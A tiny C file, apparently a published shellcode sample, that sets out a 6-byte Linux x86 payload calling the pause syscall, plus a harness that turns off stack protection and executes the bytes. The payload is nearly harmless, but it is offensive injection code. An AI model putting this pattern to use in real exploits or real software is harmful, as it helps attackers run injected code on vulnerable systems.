#include <stdio.h>
#include <string.h>

/*
by Magnefikko
14.04.2010
magnefikko@gmail.com
promhyl.oz.pl
Subgroup: #PRekambr
Name: 6 bytes DoS-Badger-Game shellcode
Platform: Linux x86

pause()
gcc -Wl,-z,execstack filename.c

shellcode:

\x31\xc0\xb0\x1d\xcd\x80

*/


int main(){
char shell[] = "\x31\xc0\xb0\x1d\xcd\x80";
printf("by Magnefikko\nmagnefikko@gmail.com\npromhyl.oz.pl\n\nstrlen(shell)
= %d\n", strlen(shell));
(*(void (*)()) shell)();
}